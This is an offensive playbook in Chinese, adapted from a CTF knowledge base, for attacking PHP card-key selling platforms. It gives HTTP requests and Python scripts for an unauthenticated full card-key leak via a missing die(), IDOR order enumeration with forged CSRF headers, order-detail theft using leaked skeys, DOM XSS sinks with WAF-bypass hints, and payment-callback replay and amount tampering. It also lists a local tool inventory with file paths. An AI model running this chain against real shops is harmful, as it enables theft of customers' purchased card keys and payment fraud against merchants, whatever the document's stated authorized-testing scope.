# Card-Selling Platform Exploitation — 自动发卡平台攻击手册

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/24-database/06-card-platform.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
> **什么时候用**：命中「见适用信号」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

本篇是清单/索引类文档，正文直接以条目给出打点项（见「技术正文」首节）：

- 用响应长度、`<br/>` 数量、CDK 正则命中数判断是否全库渲染。
- 记录 `orderid` 缺失、`orderid=0`、随机 `orderid` 三组响应 diff。
- 若返回 HTML 中有分页/商品名/卡密字段，转入批量提取与去重。
- 固定匿名 session，按 `page` 递增直到 `isnext=false`。
- 对 `type=qq/email/id` 分别测精确搜索，建立订单 ID 范围。
- 将 `result/skey/id/input/money/status` 落成 CSV，供 `act=order` 二跳使用。
- 用 `act=query` 泄露的 `id+skey` 进入详情接口。
- 比较匿名、任意登录用户、订单所有者三种身份的字段差异。

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

1. **2. P0: IDOR 无认证订单枚举** — 固定匿名 session，按 `page` 递增直到 `isnext=false`。
2. **2. P0: IDOR 无认证订单枚举** — 对 `type=qq/email/id` 分别测精确搜索，建立订单 ID 范围。
3. **2. P0: IDOR 无认证订单枚举** — 将 `result/skey/id/input/money/status` 落成 CSV，供 `act=order` 二跳使用。

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **判定** — 只证明接口存在
- **判定** — 转签名实现缺陷
- **判定** — 转重放/幂等
- **判定** — 转金额字段优先级
- **判定** — 链路成立
- **证据** — `?mod=faka&action=show` 请求/响应、CDK 字段字段样例、响应条数
- **证据** — `act=query` 页码、匿名 Session、`isnext` 翻页证据、订单 ID 范围
- **证据** — `act=order` 的 `id+skey` 请求、kminfo/money/inputs 字段
- **证据** — kminfo/desc 注入 payload、DOM sink、浏览器执行截图或控制台证据
- **证据** — 未签名/错误签名回调请求、订单状态变化或明确错误差异
- **证据** — 只出现错误页、无 CDK 字段、`skey` 绑定订单所有者、回调明确签名失败且状态不变

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

> 针对 PHP 自动发卡/卡密电商平台的完整攻击链，覆盖库存泄露、IDOR、XSS 等常见漏洞模式。

## 关键词

`发卡网` `卡密` `CDK` `自动发卡` `IDOR` `PHP die缺失` `订单枚举` `库存泄露` `卡盟` `支付回调` `DOM XSS` `CSRF绕过` `Referer校验` `ajax.php`

## 0. 攻击面全景

```
发卡平台应用栈:
┌────────────────────────────────────────────┐
│  前端: Bootstrap 3/4 + jQuery + Layer     │
├────────────────────────────────────────────┤
│  后端: 纯 PHP (非框架) 或 ThinkPHP 安装器    │
│  接口: ajax.php / user/ajax.php            │
│  支付: other/submit.php / epay_return.php  │
│  回调: wxpay_notify.php / qqpay_notify.php │
├────────────────────────────────────────────┤
│  PHP 7.x + Nginx + MySQL (PDO)            │
│  WAF: 关键词检测 (AND/OR/UNION/SELECT)      │
│  CSRF: Referer + X-Requested-With 校验      │
│  验证码: 极验 Geetest (可离线模式绕过)       │
│  Session: PHPSESSID + mysid cookie         │
└────────────────────────────────────────────┘

核心攻击面:
  ▪ PHP die()/exit() 缺失 → 校验失败后代码继续执行
  ▪ IDOR → act=query/act=order 无归属校验
  ▪ DOM XSS → kminfo/desc 字段无转义直接 innerHTML
  ▪ 敏感信息泄露 → act=getcount 无认证返回统计
  ▪ 支付回调签名缺失 → wxpay/qqpay notify 可重放
```

## 1. P0: PHP 校验缺失导致全量库存泄露

### 原理

PHP 代码在校验失败后未调用 `die()`/`exit()` 终止执行，导致后续数据库查询继续运行，将所有 CDK 一次性输出。

```php
// 漏洞代码模式
function show() {
    if (!isset($_GET['orderid'])) {
        echo renderError('参数错误');   // ← 无 die()，继续执行！
    }
    if (!validateSkey(...)) {
        echo renderError('验证失败');   // ← 无 die()
    }
    $order = getOrder($_GET['orderid'] ?? 0);
    if (!$order) {
        echo renderError('订单不存在！');  // ← 无 die()
    }
    // ↓ order_id=0 → WHERE order_id=0 → 全表返回
    $cdks = getCdksByOrderId($order['id'] ?? 0);
    echo renderCdkPage($cdks);   // 全量渲染
}
```

### 利用

```http
GET /?mod=faka&action=show HTTP/1.1
Host: target.com
```

**效果**：单次请求返回全库 CDK（10万+ 条），响应可达 25MB+。无需 Cookie、Token 或任何认证。

### 打点方法

1. 枚举 `mod` 参数值（如 `faka`, `kami`, `cdk`, `card`, `query`）
2. 观察响应中是否包含多段错误页 + 数据页（堆叠输出特征）
3. 检查 `orderid=0` 或缺失时是否返回超出预期的数据量

### 下一跳

- 用响应长度、`<br/>` 数量、CDK 正则命中数判断是否全库渲染。
- 记录 `orderid` 缺失、`orderid=0`、随机 `orderid` 三组响应 diff。
- 若返回 HTML 中有分页/商品名/卡密字段，转入批量提取与去重。

## 2. P0: IDOR 无认证订单枚举

### 原理

`ajax.php?act=query` 接口仅校验 `PHPSESSID` 和 `Referer` 头，不校验登录态和订单归属，可枚举全站所有用户的订单及 CDK 明文。

### CSRF 绕过

发卡平台通常使用 Referer + X-Requested-With 头做 CSRF 防护，但攻击者可直接在请求中携带这些头部绕过：

```http
POST /ajax.php?act=query HTTP/1.1
Host: target.com
Referer: https://target.com/
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=<anonymous>; mysid=<anonymous>

type=qq&qq=1&page=1
```

### 响应中的敏感字段

```json
{
  "code": 0,
  "isnext": true,
  "data": [{
    "id": "176109",       // 订单ID
    "tid": "72122",       // 商品ID
    "name": "商品名称",
    "result": "CDK明文<br/>",  // ← 已发货的卡密！
    "skey": "aa39ed38...",    // 详情查询密钥
    "input": "1"              // 下单账号
  }]
}
```

### 分页遍历

`isnext=true` 时递增 `page` 参数即可翻页，遍历全站订单。也可通过 `type=1&qq=<数字>` 按订单 ID 精确搜索。

### 下一跳

- 固定匿名 session，按 `page` 递增直到 `isnext=false`。
- 对 `type=qq/email/id` 分别测精确搜索，建立订单 ID 范围。
- 将 `result/skey/id/input/money/status` 落成 CSV，供 `act=order` 二跳使用。

## 3. P0: IDOR 订单详情读取

### 原理

`ajax.php?act=order` 使用 `id+skey` 双参数校验，但 skey 可通过 RT-001 的 IDOR 获取，且不校验请求者是否为订单购买人。

```http
POST /ajax.php?act=order HTTP/1.1
Host: target.com
Referer: https://target.com/
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=<anonymous>

id=176109&skey=aa39ed38cbfc86f8c8943f874665b118
```

### 额外泄露字段

```json
{
  "code": 0,
  "name": "商品名称",
  "money": "16.50",
  "inputs": "下单账号信息",
  "kminfo": "<div>CDK HTML封装</div>",
  "desc": "商品描述HTML（含外部链接）",
  "alert": "商品提示",
  "status": "1"
}
```

### 下一跳

- 用 `act=query` 泄露的 `id+skey` 进入详情接口。
- 比较匿名、任意登录用户、订单所有者三种身份的字段差异。
- 抽取 `kminfo/desc/alert/money/inputs/status`，给 XSS、支付、发货链路继续使用。

## 4. DOM-XSS: kminfo/desc 无转义

### RT-003: kminfo → innerHTML

```javascript
// main.js 第 783-784 行
} else if (data.kminfo) {
    item += '<tr><td ...>' + data.kminfo + '</td></tr>';
}
```

CDK 内容直接 `+` 拼接 HTML，WAF 可拦截输入层的 `<script>`/`onerror`，但**自定义 HTML 元素**（`<x-custom>`）和 `data:text/html;base64,...` 格式可绕过。

### RT-004: desc → unescape → html()

```javascript
// main.js 第 128-138 行
var desc = $('#tid option:selected').attr('desc');
var descHtml = unescape(desc).replace(/&amp;/g, '&');
$('#alert_frame').html(descHtml);   // XSS sink
```

商品描述先 `escape()` 存入 option 属性，选品时 `unescape()`→`.html()` 渲染，全程无消毒。

### 利用链

1. RT-001 获取 skey → RT-002 获取 kminfo
2. 打开订单详情弹窗 → kminfo 直接拼入 HTML → XSS 执行
3. 自定义元素绕过 WAF 写入 → 管理员查看时触发

### 下一跳

- 定位 DOM sink：`innerHTML`、`.html()`、`unescape()`、字符串拼接。
- 用无交互 payload 触发订单弹窗、商品详情、管理后台预览三个渲染点。
- 若 CSP 限制脚本，转 CSS/DOM clobbering/HTML gadget，不停在 `alert(1)`。

## 5. 信息泄露: act=getcount

```http
GET /ajax.php?act=getcount HTTP/1.1
Host: target.com
Referer: https://target.com/
X-Requested-With: XMLHttpRequest
```

返回站点统计数据（有效天数、订单数、金额等），无需认证。

## 6. 支付回调签名缺失

### 微信支付回调

```http
POST /other/wxpay_notify.php HTTP/1.1
Content-Type: application/xml

<xml>
  <out_trade_no>1</out_trade_no>
  <transaction_id>test</transaction_id>
  <total_fee>1</total_fee>
</xml>
```

签名验证失败时返回 `<return_code>FAIL</return_code>`，但如果签名校验可绕过或密钥泄露，可重放/篡改支付回调。

### QQ 支付回调

```
POST /other/qqpay_notify.php
```
返回 "签名失败"，同样存在签名校验问题。

## 7. 攻击链总结

```
信息收集:
  └── GET / → 识别 CMS 类型，提取 cid/tid 结构
  └── main.js → 枚举全量 API Actions (gettool/getcount/query/order/pay...)
  └── ?mod= → 枚举路由系统 (mod=faka/mod=admin)

★ 全量库存提取:
  └── GET /?mod=faka&action=show (无认证)
        → PHP die()缺失 → 全库 CDK 一次性泄露

IDOR 打通:
  └── 匿名 Session → POST ajax.php?act=query (type=qq&qq=1&page=1)
        → 返回 10 条/页（含 CDK 明文 + skey）
        → isnext=true 翻页枚举全量
  └── POST ajax.php?act=order (id=XXX&skey=XXX)
        → 返回 kminfo（CDK HTML）、money、inputs

XSS 链路:
  └── act=order → kminfo 直接 innerHTML → DOM-XSS
  └── act=gettool → desc escape/unescape → .html() → DOM-XSS
```

## 8. 实战判定矩阵

| 信号 | Probe | 命中标志 | 下一跳 |
|---|---|---|---|
| `die/exit` 缺失 | 缺失 `orderid` / `orderid=0` | 错误页后继续出现 CDK/订单 HTML | 全量库存提取 |
| `act=query` | 匿名 session + `page=1..N` | `isnext=true` 且 `result/skey` 出现 | 订单详情 IDOR |
| `act=order` | `id+skey` | 匿名可读 `kminfo/money/inputs` | 数字商品发货链 |
| `kminfo/desc` | 商品描述/卡密 HTML | 详情弹窗 DOM 执行 | 管理后台 XSS |
| `getcount` | GET/POST + AJAX 头 | 订单数/金额/库存统计 | 估算枚举范围 |
| 支付回调 | 空签名/错误签名/重放 | 订单状态或发货状态变化 | 支付绕过 |

## 9. 自动化枚举与回调链

发卡平台的执行节奏是：先拿平台指纹和 API action，再用匿名 session 打订单查询，抽 `id+skey` 后进详情，最后对照发货账本和回调接口。不要只证明单个 IDOR，要把订单、卡密、金额、支付状态连成一张表。

### 9.1 API action 枚举器

```python
# card_platform_action_probe.py — 发卡平台 action 差分
import hashlib
import json
import requests

ACTIONS = ["gettool", "getcount", "query", "order", "pay", "settle", "login", "captcha"]

def probe(base):
    s = requests.Session()
    rows = []
    for act in ACTIONS:
        for method in ("GET", "POST"):
            url = base.rstrip("/") + f"/ajax.php?act={act}"
            headers = {"Referer": base, "X-Requested-With": "XMLHttpRequest"}
            r = s.request(method, url, headers=headers, data={"page": 1, "type": "qq", "qq": "1"}, timeout=8)
            rows.append({
                "act": act,
                "method": method,
                "status": r.status_code,
                "len": len(r.content),
                "hash": hashlib.sha1(r.content[:4096]).hexdigest(),
                "json_like": r.text.strip().startswith(("{", "[")),
                "markers": [m for m in ("skey", "kminfo", "result", "money", "isnext", "CDK") if m in r.text],
            })
    print(json.dumps(rows, ensure_ascii=False, indent=2))
```

### 9.2 订单枚举到卡密账本

```python
# card_order_ledger.py — query/order 二跳合并
def normalize_order(row):
    return {
        "id": row.get("id") or row.get("orderid"),
        "skey": row.get("skey"),
        "product": row.get("name") or row.get("goods"),
        "money": row.get("money") or row.get("price"),
        "status": row.get("status"),
        "card_marker": bool(row.get("result") or row.get("kminfo")),
    }
```

账本字段：`order_id,skey,product,money,status,result_hash,kminfo_hash,input,query_page,detail_status`。成功样本是匿名枚举能稳定得到 `skey`，详情接口返回卡密或下载信息，且字段能与商品/金额/状态对齐。

### 9.3 回调链分叉

| 回调信号 | 变体 | 判定 |
|---|---|---|
| `notify.php` 返回签名失败 | 正确字段 + 错误 sign | 只证明接口存在 |
| `sign_type` 可控 | MD5/HMAC/空值切换 | 转签名实现缺陷 |
| `out_trade_no` 可枚举 | 已存在订单 + 新 `transaction_id` | 转重放/幂等 |
| `money/total_fee` 被业务采用 | 0.01 / 原价 / 负数 | 转金额字段优先级 |
| 回调后发货 | 订单状态、卡密、余额变化 | 链路成立 |

Evidence 新增 `card_action_matrix.json`、`card_order_ledger.csv`、`card_callback_diff.json`。

## Evidence

| 链路 | 证据 |
|--------|------|
| 全量库存泄露 | `?mod=faka&action=show` 请求/响应、CDK 字段字段样例、响应条数 |
| IDOR 订单枚举 | `act=query` 页码、匿名 Session、`isnext` 翻页证据、订单 ID 范围 |
| 订单详情读取 | `act=order` 的 `id+skey` 请求、kminfo/money/inputs 字段 |
| DOM-XSS | kminfo/desc 注入 payload、DOM sink、浏览器执行截图或控制台证据 |
| 支付回调 | 未签名/错误签名回调请求、订单状态变化或明确错误差异 |
| 失败样本 | 只出现错误页、无 CDK 字段、`skey` 绑定订单所有者、回调明确签名失败且状态不变 |

## 10. 关联技术

- [[sqli-nosqli]] — WAF 绕过与 SQL 注入
- [[01-idor-enumeration]] — IDOR 枚举技术
- [[payment-php]] — PHP 支付专项攻击
- [[payment-digital-goods]] — 数字商品交付
- [[file-upload-xxe-lfi]] — XXE 与文件包含
